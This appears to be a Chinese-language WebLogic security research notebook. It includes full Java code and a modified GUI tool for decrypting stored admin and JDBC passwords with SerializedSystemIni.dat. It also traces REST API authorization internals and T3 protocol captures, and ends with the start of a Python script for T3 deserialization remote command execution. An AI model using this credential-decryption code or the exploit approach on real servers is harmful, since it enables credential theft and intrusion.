### 添加一个用户，用户账号密码存储在文件中，把用户密码解密出来

#### 准备内容

- 用户账号密码存储位置为


```
E:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\security\boot.properties
```

- 数据连接账号密码存储在


```
E:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\config\jdbc\JDBC_Data_Source-0-3407-jdbc.xml
E:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\config\jdbc\JDBC_Data_Source-2-3409-jdbc.xml
```

- weblogic加密秘钥位置为


```
E:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\security\SerializedSystemIni.dat
```

- weblogic11之后进行解密时需要用到cryptoj.jar，位置为


```
E:\Oracle\Middleware\Oracle_Home\oracle_common\modules\oracle.rsa\cryptoj.jar
```

- 此外，还需要生成wlfullclient.jar作为基础依赖库


#### 通过java代码进行解密

需要将SerializedSystemIni.dat放在java代码所在目录下，同时导入cryptoj.jar和成wlfullclient.jar，在IDEA中运行

```java
import weblogic.security.internal.*;
import weblogic.security.internal.encryption.*;


import java.io.PrintStream;

public class Decrypt {
    static EncryptionService es = null;
    static ClearOrEncryptedService ces = null;

    public static void main(String[] args) {
        String s = "{AES256}MwonUqMtWF0Lygu08KMRtQz3E2I2Fy5Tt3C2fqRurL0=";

        es = SerializedSystemIni.getExistingEncryptionService();

        if (es == null) {
            System.err.println("Unable to initialize encryption service");
            return;
        }

        ces = new ClearOrEncryptedService(es);

        if (s != null) {
            System.out.println("\nDecrypted Password is:" + ces.decrypt(s));
        }
    }
}
```

在依赖cryptoj.jar和成wlfullclient.jar的情况下，代码可以运行成功，并输出解密结果为weblogic1

![image-20230716165805586](.\images\image-20230716165805586.png)

该代码位于/crack/crack_idea目录下

#### 通过GUI工具进行解密

在网上找到weblogic 解密工具，GitHub地址为[Decrypt_Weblogic_Password/Tools5-weblogic_decrypt at master · TideSec/Decrypt_Weblogic_Password (github.com)](https://github.com/TideSec/Decrypt_Weblogic_Password/tree/master/Tools5-weblogic_decrypt)，但是这个java工具版本太低无法解密，并且没有报错信息，对工具代码进行反编译，发现主要问题在读取的密文格式，该工具只写了处理{AES}开头的密文，而现有较新版本的密文是以{AES256}开头，修改这个逻辑之后，再将代码中较老的库替换为新版，如base64编码等，再将报错信息输出到结果框，然后重新打包为crack_gui.jar，该工具的依赖库bcprov-jdk15on-152.jar需要跟该工具在同一目录下，然后运行crack_gui.jar即可通过图形界面选择密钥文件和输入密文进行解密

反编译后并经过修改的核心代码如下

```java
import org.bouncycastle.jce.provider.BouncyCastleProvider;

import javax.crypto.*;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.PBEParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.security.*;
import java.security.spec.InvalidKeySpecException;
import java.util.Base64;


public class DecryptorUtilNew {
    public static void main(String[] args) throws IOException, NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, BadPaddingException, IllegalBlockSizeException, InvalidKeySpecException, InvalidAlgorithmParameterException {
        Security.addProvider(new BouncyCastleProvider());
//        String serializedSystemIniPath = args[0];
//        String ciphertext = args[1];
        String serializedSystemIniPath = "D:\\security\\crack\\SerializedSystemIni.dat";
        String ciphertext = "{AES256}n4hDc0ZjlchRswbFxFl8QeLHdbSZs4MXtG05jxqM8ko=";
        String cleartext = "";
        if (ciphertext.startsWith("{AES256}")) {
            ciphertext = ciphertext.replaceFirst("\\{AES256\\}", "");
            cleartext = decryptAES(serializedSystemIniPath, ciphertext);
        } else if (ciphertext.startsWith("{3DES}")) {
            ciphertext = ciphertext.replaceFirst("\\{3DES\\}", "");
            cleartext = decrypt3DES(serializedSystemIniPath, ciphertext);
        }
        System.out.println(cleartext);
    }

    public static String decrypt(String serializedSystemIniPath, String ciphertext) {
        String cleartext = "";
        try {
            Security.addProvider((Provider)new BouncyCastleProvider());
            if (ciphertext.startsWith("{AES256}")) {
                ciphertext = ciphertext.replaceAll("^[{AES256}]+", "");
                cleartext = decryptAES(serializedSystemIniPath, ciphertext);
            } else if (ciphertext.startsWith("{3DES}")) {
                ciphertext = ciphertext.replaceAll("^[{3DES}]+", "");
                cleartext = decrypt3DES(serializedSystemIniPath, ciphertext);
            }
        } catch (Exception ex) {
            ex.printStackTrace();
            cleartext = "exception"+ ex.getMessage();
        }
        return cleartext;
    }


    public static String decryptAES(String serializedSystemIni, String ciphertext) throws NoSuchAlgorithmException, InvalidKeySpecException, NoSuchPaddingException, InvalidAlgorithmParameterException, InvalidKeyException, BadPaddingException, IllegalBlockSizeException, IOException {
        byte[] encryptedPassword1 = Base64.getDecoder().decode(ciphertext);

        byte[] salt = null;
        byte[] encryptionKey = null;
        String key = "0xccb97558940b82637c8bec3c770f86fa3a391a56";
        char[] password = new char[key.length()];
        key.getChars(0, password.length, password, 0);
        FileInputStream is = new FileInputStream(serializedSystemIni);
        try {
            salt = readBytes(is);
            int version = is.read();
            if (version != -1) {
                encryptionKey = readBytes(is);
                if (version >= 2)
                    encryptionKey = readBytes(is);
            }
        } catch (IOException e) {
            return e.getMessage();
        }
        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("PBEWITHSHAAND128BITRC2-CBC");
        PBEKeySpec pbeKeySpec = new PBEKeySpec(password, salt, 5);
        SecretKey secretKey = keyFactory.generateSecret(pbeKeySpec);
        PBEParameterSpec pbeParameterSpec = new PBEParameterSpec(salt, 0);
        Cipher cipher = Cipher.getInstance("PBEWITHSHAAND128BITRC2-CBC");
        cipher.init(2, secretKey, pbeParameterSpec);
        SecretKeySpec secretKeySpec = new SecretKeySpec(cipher.doFinal(encryptionKey), "AES");
        byte[] iv = new byte[16];
        System.arraycopy(encryptedPassword1, 0, iv, 0, 16);
        int encryptedPasswordlength = encryptedPassword1.length - 16;
        byte[] encryptedPassword2 = new byte[encryptedPasswordlength];
        System.arraycopy(encryptedPassword1, 16, encryptedPassword2, 0, encryptedPasswordlength);
        IvParameterSpec ivParameterSpec = new IvParameterSpec(iv);
        Cipher outCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        outCipher.init(2, secretKeySpec, ivParameterSpec);
        byte[] cleartext = outCipher.doFinal(encryptedPassword2);
        return new String(cleartext, "UTF-8");
    }

    public static String decrypt3DES(String serializedSystemIni, String ciphertext) throws NoSuchAlgorithmException, InvalidKeySpecException, NoSuchPaddingException, InvalidAlgorithmParameterException, InvalidKeyException, BadPaddingException, IllegalBlockSizeException, IOException {
        byte[] encryptedPassword1 = Base64.getDecoder().decode(ciphertext);

        byte[] salt = null;
        byte[] encryptionKey = null;
        String PW = "0xccb97558940b82637c8bec3c770f86fa3a391a56";
        char[] password = new char[PW.length()];
        PW.getChars(0, password.length, password, 0);
        FileInputStream is = new FileInputStream(serializedSystemIni);
        try {
            salt = readBytes(is);
            int version = is.read();
            if (version != -1) {
                encryptionKey = readBytes(is);
                if (version >= 2)
                    encryptionKey = readBytes(is);
            }
        } catch (IOException e) {
            return e.getMessage();
        }
        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("PBEWITHSHAAND128BITRC2-CBC");
        PBEKeySpec pbeKeySpec = new PBEKeySpec(password, salt, 5);
        SecretKey secretKey = keyFactory.generateSecret(pbeKeySpec);
        PBEParameterSpec pbeParameterSpec = new PBEParameterSpec(salt, 0);
        Cipher cipher = Cipher.getInstance("PBEWITHSHAAND128BITRC2-CBC");
        cipher.init(2, secretKey, pbeParameterSpec);
        SecretKeySpec secretKeySpec = new SecretKeySpec(cipher.doFinal(encryptionKey), "DESEDE");
        byte[] iv = new byte[8];
        System.arraycopy(salt, 0, iv, 0, 4);
        System.arraycopy(salt, 0, iv, 4, 4);
        IvParameterSpec ivParameterSpec = new IvParameterSpec(iv);
        Cipher outCipher = Cipher.getInstance("DESEDE/CBC/PKCS5Padding");
        outCipher.init(2, secretKeySpec, ivParameterSpec);
        byte[] cleartext = outCipher.doFinal(encryptedPassword1);
        return new String(cleartext, "UTF-8");
    }

    public static byte[] readBytes(InputStream stream) throws IOException {
        int length = stream.read();
        byte[] bytes = new byte[length];
        int in = 0;
        while (in < length) {
            int justread = stream.read(bytes, in, length - in);
            if (justread == -1)
                break;
            in += justread;
        }
        if(in < length) {
            throw new IOException("Not enough bytes available in stream");
        }
        return bytes;
    }
}
```

crack_gui程序可通过图形界面进行解密操作

![image-20230716171637017](.\images\image-20230716171637017.png)

解密工具crack_gui位于/crack目录下，crack_gui的源码位于/crack/crack_gui目录下



### rest API如何验证用户组角色权限

#### 黑盒分析

创建一个monitor角色，账号密码为:weblogic2:weblogic2

![image-20230720110214035](.\images\image-20230720110214035.png)

管理员用户为默认用户，账号密码为weblogic:weblogic1

![image-20230720110258285](.\images\image-20230720110258285.png)

使用管理员账号weblogic，通过postman发包创建服务器，创建成功

![image-20230720110528098](.\images\image-20230720110528098.png)



使用monitor 账号weblogic2，通过postman发包创建服务器，创建失败，显示forbidden

![image-20230720110820292](.\images\image-20230720110820292.png)

使用错误的用户名或者密码，会显示unauthorized

![image-20230720110954002](.\images\image-20230720110954002.png)

如果附带有效的cookie，则会跳过基础的用户名密码验证，直接获取相应权限，即带上管理员cookie则有管理员权限

#### 白盒分析

向weblogic服务器发起http请求时，处理逻辑主要是在processSecuredExecute函数，该函数的位于

```
weblogic.servlet.internal.WebAppServletContext#processSecuredExecute
```

服务器整体调用栈如下

```
processSecuredExecute:2502, WebAppServletContext (weblogic.servlet.internal)
doSecuredExecute:2351, WebAppServletContext (weblogic.servlet.internal)
securedExecute:2326, WebAppServletContext (weblogic.servlet.internal)
execute:2304, WebAppServletContext (weblogic.servlet.internal)
runInternal:1779, ServletRequestImpl (weblogic.servlet.internal)
run:1733, ServletRequestImpl (weblogic.servlet.internal)
run:272, ContainerSupportProviderImpl$WlsRequestExecutor (weblogic.servlet.provider)
_runAs:352, ComponentInvocationContextManager (weblogic.invocation)
runAs:337, ComponentInvocationContextManager (weblogic.invocation)
doRunWorkUnderContext:57, LivePartitionUtility (weblogic.work)
runWorkUnderContext:41, PartitionUtility (weblogic.work)
runWorkUnderContext:651, SelfTuningWorkManagerImpl (weblogic.work)
execute:420, ExecuteThread (weblogic.work)
run:360, ExecuteThread (weblogic.work)
```

processSecuredExecute函数的为相对顶层的处理流程，首先从顶层分析对http请求的处理流程，包括rest api请求的权限认证，再从底层函数调用去看权限认证的具体方式

processSecuredExecute的反编译后的代码内容如下，已经在代码不同部分加上了注释：

```java
// processSecuredExecute是处理安全相关Web请求的方法
private static void processSecuredExecute(ServletInvocationContext context, HttpServletRequest req, HttpServletResponse rsp, boolean applyAuthFilters, boolean suspending, boolean isContextSuspending, HttpSession s) throws Throwable {
    // 检查用户是否有权限访问请求的资源
    if (context.getSecurityManager().checkAccess(req, rsp, applyAuthFilters, false)) {
        // 如果用户的会话不为空
        if (s != null) {
            // 获取并发请求的数量
            int count = ((SessionSecurityData)s).getConcurrentRequestCount();
            // 检查并发请求的数量是否超过了最大值
            if (maxConcurrentRequestsAllowed != -1 && count > maxConcurrentRequestsAllowed) {
                // 记录错误信息并发送HTTP 500错误
                context.logError("Rejecting request since concurrent requests allowable limit exceeded :" + maxConcurrentRequestsAllowed);
                rsp.sendError(500);
                return;
            }
        }

        // 创建一个requestFacade对象，以便访问请求的细节
        ServletObjectsFacade requestFacade = context.getSecurityContext().getRequestFacade();
        // 检查是否需要发送HTTP 100 Continue响应
        if (!doNotSendContinueHeader && "HTTP/1.1".equals(requestFacade.getProtocol(req)) && context.getSecurityManager().getAuthMethod() != null && !context.getSecurityManager().isFormAuth() && !requestFacade.isInternalDispatch(req) && "100-continue".equalsIgnoreCase(requestFacade.getExpectHeader(req))) {
            // 发送HTTP 100 Continue响应
            requestFacade.send100ContinueResponse(req);
        }

        // 获取当前用户
        SubjectHandle subject = SecurityModule.getCurrentUser(context.getSecurityContext(), req);
        // 如果用户为空，则创建一个匿名用户
        if (subject == null) {
            subject = WebAppSecurity.getProvider().getAnonymousSubject();
        } else {
            // 设置用户的用户名
            requestFacade.getHttpAccountingInfo(req).setRemoteUser(subject.getUsername());
        }

        // 获取安全管理器
        WebAppSecurity securityManager = context.getSecurityManager();
        // 获取包装后的请求对象
        HttpServletRequest wrappedReq = securityManager.getWrappedRequest(req);
        // 如果存在包装后的请求对象，就替换原始的请求对象
        if (wrappedReq != null) {
            req = wrappedReq;
        }

        // 获取包装后的响应对象
        HttpServletResponse wrappedRsp = securityManager.getWrappedResponse(req, rsp);
        // 如果存在包装后的响应对象，就替换原始的响应对象
        if (wrappedRsp != null) {
            rsp = wrappedRsp;
        }

        // 创建一个ServletInvocationAction对象
        PrivilegedAction<Object> action = new ServletInvocationAction(req, rsp, context, requestFacade.getServletStub(req));
        // 以当前用户的身份运行这个动作
        Throwable e = (Throwable)subject.run(action);
        // 如果在运行过程中存在异常，就抛出这个异常
        if (e != null) {
            throw e;
        } else {
            // 调用安全管理器的postInvoke方法进行后处理
            context.getSecurityManager().postInvoke(req, rsp, subject);
        }
    }
}

```

以下是通过postman以weblogic2:weblogic2的认证方式向weblogic服务器发送创建server的rest api请求过程

创建完用户主体subject之后，找到subject下的authSubject，再找到authSubject下的subject属性，然后可以看到principals属性中，包含用户名weblogic2以及所属的组Minitors，在privCredentials属性中，可以看到用户的其他详细信息，如所属的安全策略为myrealm，所属的域为base_domain

![image-20230720150607787](.\images\image-20230720150607787.png)

创建完securityManager之后，可以看到该对象的属性中包含了与当前域内相关的安全策略，如用户角色为Operator\Monitor\Admin\Deployer，认证方式为basic，即用户名密码

![image-20230720152050218](.\images\image-20230720152050218.png)

创建action对象，此时action对象下的rsp属性下的statusMessage属性为null

![image-20230720152645111](.\images\image-20230720152645111.png)

subject对象将action对象作为参数执行run方法之后，rsp中各个属性被赋值，statusMessage变成了Forbidden，同时postman客户端接收到了返回结果，函数最后再执行postInvoke方法进行后调用，至此，顶层函数调用过程结束

![image-20230720152819810](.\images\image-20230720152819810.png)



权限处理的方面分为两个方面，第一个是验证用户是否通过授权，也就是发起该请求的用户是否为weblogic服务器的注册用户，第二个是用户的权限是否足够执行它的请求

#### 验证用户是否通过授权

从顶层逻辑的checkaccess函数往下进入，通过多层调用验证用户是否通过授权，大概思路是先检查用户访问的资源是否静态资源，如果为不为静态资源，则需要检查用户是否有权限，先看用户的cookie等信息是否有效，如果有效则通过检测，如果无效则可以让用户输入用户名密码进行验证，验证通过则通过检测

```
checkUserPerm:82, CertSecurityModule (weblogic.servlet.security.internal)
checkAccess:79, ChainedSecurityModule (weblogic.servlet.security.internal)
isAuthorized:738, SecurityModule (weblogic.servlet.security.internal)
checkAccess:603, WebAppSecurity (weblogic.servlet.security.internal)
checkAccess:563, WebAppSecurity (weblogic.servlet.security.internal)
processSecuredExecute:2448, WebAppServletContext (weblogic.servlet.internal)
doSecuredExecute:2351, WebAppServletContext (weblogic.servlet.internal)
securedExecute:2326, WebAppServletContext (weblogic.servlet.internal)
execute:2304, WebAppServletContext (weblogic.servlet.internal)
runInternal:1779, ServletRequestImpl (weblogic.servlet.internal)
run:1733, ServletRequestImpl (weblogic.servlet.internal)
run:272, ContainerSupportProviderImpl$WlsRequestExecutor (weblogic.servlet.provider)
_runAs:352, ComponentInvocationContextManager (weblogic.invocation)
runAs:337, ComponentInvocationContextManager (weblogic.invocation)
doRunWorkUnderContext:57, LivePartitionUtility (weblogic.work)
runWorkUnderContext:41, PartitionUtility (weblogic.work)
runWorkUnderContext:651, SelfTuningWorkManagerImpl (weblogic.work)
execute:420, ExecuteThread (weblogic.work)
run:360, ExecuteThread (weblogic.work)
```



#### 判断用户是否有权限执行操作

从顶层逻辑的subject.run函数往下进入，当变量中第一次出现403和forbidden的时候，相当于是判断用户权限不够的时候

```
run:261, ServerRuntime$1 (org.glassfish.jersey.server)
call:248, Errors$1 (org.glassfish.jersey.internal)
call:244, Errors$1 (org.glassfish.jersey.internal)
process:292, Errors (org.glassfish.jersey.internal)
process:274, Errors (org.glassfish.jersey.internal)
process:244, Errors (org.glassfish.jersey.internal)
runInScope:265, RequestScope (org.glassfish.jersey.process.internal)
process:232, ServerRuntime (org.glassfish.jersey.server)
handle:680, ApplicationHandler (org.glassfish.jersey.server)
serviceImpl:392, WebComponent (org.glassfish.jersey.servlet)
service:346, WebComponent (org.glassfish.jersey.servlet)
service:365, ServletContainer (org.glassfish.jersey.servlet)
service:318, ServletContainer (org.glassfish.jersey.servlet)
service:205, ServletContainer (org.glassfish.jersey.servlet)
run:295, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)
run:260, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)
invokeServlet:137, StubSecurityHelper (weblogic.servlet.internal)
execute:353, ServletStubImpl (weblogic.servlet.internal)
doFilter:25, TailFilter (weblogic.servlet.internal)
doFilter:82, FilterChainImpl (weblogic.servlet.internal)
callChain:82, CorsAuthFilter (weblogic.management.rest.utils)
doFilter:44, CorsAuthFilter (weblogic.management.rest.utils)
doFilter:82, FilterChainImpl (weblogic.servlet.internal)
doFilter:32, RequestEventsFilter (weblogic.servlet.internal)
doFilter:82, FilterChainImpl (weblogic.servlet.internal)
wrapRun:3866, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)
run:3829, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)
doAs:344, AuthenticatedSubject (weblogic.security.acl.internal)
runAsForUserCode:197, SecurityManager (weblogic.security.service)
runAsForUserCode:203, WlsSecurityProvider (weblogic.servlet.provider)
run:71, WlsSubjectHandle (weblogic.servlet.provider)
processSecuredExecute:2502, WebAppServletContext (weblogic.servlet.internal)
doSecuredExecute:2351, WebAppServletContext (weblogic.servlet.internal)
securedExecute:2326, WebAppServletContext (weblogic.servlet.internal)
execute:2304, WebAppServletContext (weblogic.servlet.internal)
runInternal:1779, ServletRequestImpl (weblogic.servlet.internal)
run:1733, ServletRequestImpl (weblogic.servlet.internal)
run:272, ContainerSupportProviderImpl$WlsRequestExecutor (weblogic.servlet.provider)
_runAs:352, ComponentInvocationContextManager (weblogic.invocation)
runAs:337, ComponentInvocationContextManager (weblogic.invocation)
doRunWorkUnderContext:57, LivePartitionUtility (weblogic.work)
runWorkUnderContext:41, PartitionUtility (weblogic.work)
runWorkUnderContext:651, SelfTuningWorkManagerImpl (weblogic.work)
execute:420, ExecuteThread (weblogic.work)
run:360, ExecuteThread (weblogic.work)
```

在org.glassfish.jersey.server.ServerRuntime的process方法中，执行到ContainerResponse response = (ContainerResponse)endpoint.apply(data);这一行时，就会触发异常，此时的异常中就包含了403 Forbidden信息

![image-20230721014944209](.\images\image-20230721014944209.png)

在处理该异常的时候，就会创建一个异常response，并把这个异常response转化为response，之后将作为http请求的返回值的发送给客户端

![image-20230721015253345](.\images\image-20230721015253345.png)



### rest API分析 比如服务器模板改的是哪个地方 、system component是哪些、filestore是什么存储

**服务器模板**

```json
        "method": "post",
        "url": "/management/weblogic/{version}/edit/serverTemplates",
        "parameters": [
            {
                "schema": {
                    "$ref": "#/definitions/Server Template"
                },
                "name": "payload",
                "required": true,
                "in": "body",
                "description": "<p>Must contain a populated server template model.</p>"
            },
            {
                "$ref": "#/parameters/Request Header X-Requested-By"
            }
        ]


```

serverTemplates修改的内容为服务器模板，但这里的服务器模板和常见的web app 的html模板不同，这里的模板主要是weblogic服务器的基本配置信息，服务器模板是WebLogic用于定义创建新服务器实例时的默认配置。也就是可以为WebLogic服务器预定义某些特性，如JDBC设置，JMS设置，集群设置等等。如果要在多个地方部署类似的WebLogic服务器，使用模板可以大大提高效率，确保配置的一致性。下面是服务器模板可设置的一些参数

```
JDBCLLRTableName: JDBC登录线性记录表名
JMSConnectionFactoryUnmappedResRefMode: 为没有映射的资源引用提供JMS连接工厂的模式
JMSDefaultConnectionFactoriesEnabled: 指示是否启用JMS默认连接工厂
adminReconnectIntervalSeconds: 管理员重新连接的间隔时间（秒）
administrationPort: 用于服务器管理通信的端口号
autoMigrationEnabled: 指示是否启用自动迁移
autoRestart: 指示在失败时是否自动重启服务器
clusterWeight: 集群权重
completeMessageTimeout: 完整消息的超时时间
defaultProtocol: 默认通信协议
healthCheckIntervalSeconds: 健康检查的间隔时间（秒）
listenAddress: 服务器监听的IP地址
listenPort: 服务器监听的端口号
maxMessageSize: 可接收的最大消息大小
```





**文件存储**

    {
        "method": "post",
        "url": "/management/weblogic/{version}/edit/fileStores",
        "parameters": [
            {
                "schema": {
                    "$ref": "#/definitions/File Store"
                },
                "name": "payload",
                "required": true,
                "in": "body",
                "description": "<p>Must contain a populated file store model.</p>"
            },
            {
                "$ref": "#/parameters/Request Header X-Requested-By"
            }
        ]
    }

filestore主要用于weblogic中文件的持久化存储，对于特定的消息，可以选择设置持久化存储，这样在weblogic重启之后，消息将仍然保存。weblogic的持久化存储类型有两种，一种是数据库类型的存储，也就是JDBC存储，一种是文件存储，该api只涉及到使用文件存储进行持久化存储。FileStore通常用于存储WebLogic的子系统和服务所需的持久化数据，例如JMS消息、事务日志、EJB定时器、路径服务等。下面是filestore可设置的部分参数

```
XAResourceName: 用于FileStore的XA资源名称。
blockSize: FileStore中每个块的大小（以字节为单位）。
cacheDirectory: 用于FileStore缓存的目录路径。
deploymentOrder: 定义了在WebLogic Server启动时资源部署的顺序。
directory: FileStore使用的文件系统目录路径。
distributionPolicy: 文件分布策略，可以是"Distributed"或"Singleton"。
dynamicallyCreated: 指示FileStore是否动态创建。
failOverLimit: 文件故障转移限制。
failbackDelaySeconds: 故障恢复延迟时间（以秒为单位）。
fileLockingEnabled: 指示是否启用文件锁定。
id: FileStore的唯一标识符。
initialBootDelaySeconds: 初始启动延迟时间（以秒为单位）。
initialSize: FileStore的初始大小（以字节为单位）。
ioBufferSize: 输入/输出缓冲区大小（以字节为单位）。
logicalName: FileStore的逻辑名称。
maxFileSize: 文件的最大大小（以字节为单位）。
```

filestore的存储位置为config.xml中，这个配置文件中包含了大部分配置文件，其中某些配置文件被写在config文件夹下的其他文件夹中

![image-20230725000825140](.\images\image-20230725000825140.png)





**系统组件**

    {
        "method": "post",
        "url": "/management/weblogic/{version}/edit/systemComponents",
        "parameters": [
            {
                "schema": {
                    "$ref": "#/definitions/System Component"
                },
                "name": "payload",
                "required": true,
                "in": "body",
                "description": "<p>Must contain a populated system component model.</p>"
            },
            {
                "$ref": "#/parameters/Request Header X-Requested-By"
            }
        ]
    }

系统组件相关的资料非常少，根据官网上提供的资料，componentType只提到了 Oracle HTTP Server (OHS) 和 Coherence 缓存服务器，这两个服务器都是 Oracle Fusion Middleware 的组成部分。

```
"autoRestart": 如果为 true，则该组件在失败后将自动重新启动。
"componentType": 指定 System Component 的类型。
"dynamicallyCreated": 如果为 true，则该组件是动态创建的。动态创建的组件在服务器启动时不会自动启动，而是需要明确地被启动。
"id": 组件的唯一标识符。
"machine": 这可能是一个包含一到多个字符串的数组，用于指定运行该组件的机器的名称。
"name": 组件的名称。
"notes": 关于组件的一些注释或描述。
"restartDelaySeconds": 组件失败后重新启动之前的延迟时间（以秒为单位）。
"restartIntervalSeconds": 重新启动尝试之间的时间间隔（以秒为单位）。
"restartMax": 在放弃重新启动尝试前，尝试重新启动的最大次数。
"tags": 一组标签，可以用来分类或注解该组件。
"type": 可能是指定 System Component 类型的另一种方式。
```







### t3反序列化接口分析

网上对t3协议分析的流程图

![image-t3](.\images\t3.jpg)

通过修改之前利用jndi注入的代码，客户端向weblogic服务器绑定对象，使用t3接口

```java
package weblogic;

import org.apache.commons.lang.RandomStringUtils;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.lang.reflect.Field;
import java.util.Hashtable;

public class T3 {
    static String JNDI_FACTORY="weblogic.jndi.WLInitialContextFactory";
    private static InitialContext getInitialContext(String url)throws NamingException
    {
        Hashtable<String,String> env = new Hashtable<String,String>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
        env.put(Context.PROVIDER_URL, url);
        return new InitialContext(env);
    }
    //iiop
    //iiop
    public static void main(String args[]) throws Exception {
        InitialContext c=getInitialContext("t3://192.168.0.102:7001");

        String StrObj=new String("12345");
        String ranStr= RandomStringUtils.random(5, new char[]{'a','b','c','d','e','f', '1', '2', '3'});
        c.bind(ranStr,StrObj);
        c.lookup(ranStr);
        System.out.println("done");
    }
}
```

使用wireshark抓包可获取t3通信的数据流，绑定的字符串为12345，客户端将字符串序列化之后发送到服务器，可以在数据流中找到字符串的序列化数据，如果服务器要将该对象成功反序列化，则相应的类必须存在于服务上

```
客户端：
t3 12.2.1
AS:255
HL:19
MS:10000000
LP:DOMAIN
PU:t3://192.168.0.102:7001

服务器：
HELO:12.2.1.3.0.false
AS:2048
HL:19
MS:10000000
PN:DOMAIN

客户端发送详细信息：
.....e............q...`....a...1..wR:./!#..;*..(....ysr.xr.xr.xp.....................pppppp.....................p.........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr.$weblogic.common.internal.PackageInfo..#.......	I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatchL.	implTitlet..Ljava/lang/String;L.
implVendorq.~..L..implVersionq.~..xpw...x........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr.$weblogic.common.internal.VersionInfo."EQdRF>...[..packagest.'[Lweblogic/common/internal/PackageInfo;L..releaseVersiont..Ljava/lang/String;[..versionInfoAsBytest..[Bxr.$weblogic.common.internal.PackageInfo..#.......	I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatchL.	implTitleq.~..L.
implVendorq.~..L..implVersionq.~..xpw...x........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr.!weblogic.common.internal.PeerInfoXTt........I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatch[..packagest.'[Lweblogic/common/internal/PackageInfo;xr.$weblogic.common.internal.VersionInfo."EQdRF>...[..packagesq.~..L..releaseVersiont..Ljava/lang/String;[..versionInfoAsBytest..[Bxr.$weblogic.common.internal.PackageInfo..#.......	I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatchL.	implTitleq.~..L.
implVendorq.~..L..implVersionq.~..xpw...x...........sr..weblogic.rjvm.JVMID.I.>...*...xpwS!.........
192.168.0.102..host.docker.internal.;.........Y.........................x........sr..weblogic.rjvm.JVMID.I.>...*...xpw.....1.....
172.20.0.1.........x
服务器发送详细信息：
.....e................`....E...........D..=(.+......ysr.xr.xr.xp.....................pppppp.....................p........t3://172.18.0.2:7001.........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr..weblogic.rjvm.ClusterInfo90.s	..S.....xpw...x........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr.$weblogic.common.internal.PackageInfo..#.......	I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatchL.	implTitlet..Ljava/lang/String;L.
implVendorq.~..L..implVersionq.~..xpw...x........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr.$weblogic.common.internal.VersionInfo."EQdRF>...[..packagest.'[Lweblogic/common/internal/PackageInfo;L..releaseVersiont..Ljava/lang/String;[..versionInfoAsBytest..[Bxr.$weblogic.common.internal.PackageInfo..#.......	I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatchL.	implTitleq.~..L.
implVendorq.~..L..implVersionq.~..xpw...x........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr.!weblogic.common.internal.PeerInfoXTt........I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatch[..packagest.'[Lweblogic/common/internal/PackageInfo;xr.$weblogic.common.internal.VersionInfo."EQdRF>...[..packagesq.~..L..releaseVersiont..Ljava/lang/String;[..versionInfoAsBytest..[Bxr.$weblogic.common.internal.PackageInfo..#.......	I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatchL.	implTitleq.~..L.
implVendorq.~..L..implVersionq.~..xpw...x...........sr..weblogic.rjvm.JVMID.I.>...*...xpwr....1.....
172.20.0.1...........[.L.Aw.
172.18.0.2..5H.......Y...Y......................base_domain..AdminServer..x........sr..weblogic.rjvm.JVMID.I.>...*...xpwT...[.L.Aw.
172.18.0.2..5H.......Y...Y......................base_domain..AdminServer.x
客户端发送绑定请求以及反序列化数据
.../.e........	.......t..aeda1t..12345sr.xp?@......w.........t..java.naming.factory.initialt.%weblogic.jndi.WLInitialContextFactoryt..java.naming.provider.urlt..t3://192.168.0.102:7001xp.........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr..java.util.Hashtable...%!J.....F.
loadFactorI.	thresholdxpw...x........sr.%weblogic.rjvm.ImmutableServiceContext...pc......xr.)weblogic.rmi.provider.BasicServiceContext.c"6.......xpw...sr.&weblogic.rmi.internal.MethodDescriptor.HZ....{...xpwE.?bind(Ljava.lang.String;Ljava.lang.Object;Ljava.util.Hashtable;)...	xx...
服务器响应
.....e.............p....
客户端发送查找请求
.....e........	.......t..aeda1sr.xp?@......w.........t..java.naming.factory.initialt.%weblogic.jndi.WLInitialContextFactoryt..java.naming.provider.urlt..t3://192.168.0.102:7001xp..........sr.%weblogic.rjvm.ImmutableServiceContext...pc......xr.)weblogic.rmi.provider.BasicServiceContext.c"6.......xpw...sr.&weblogic.rmi.internal.MethodDescriptor.HZ....{...xpw5./lookup(Ljava.lang.String;Ljava.util.Hashtable;)...	xx...
服务器返回序列化之后的对象
... .e.............t..12345p....

```

通过python的socket接口向weblogic也可以发送t3请求，对于存在t3反序列化漏洞的版本，可以这样构造恶意代码造成远程命令执行

```python
import socket
import struct
import sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ("192.168.0.102", 7001)
print ('connecting to ')
sock.connect(server_address)

# Send headers
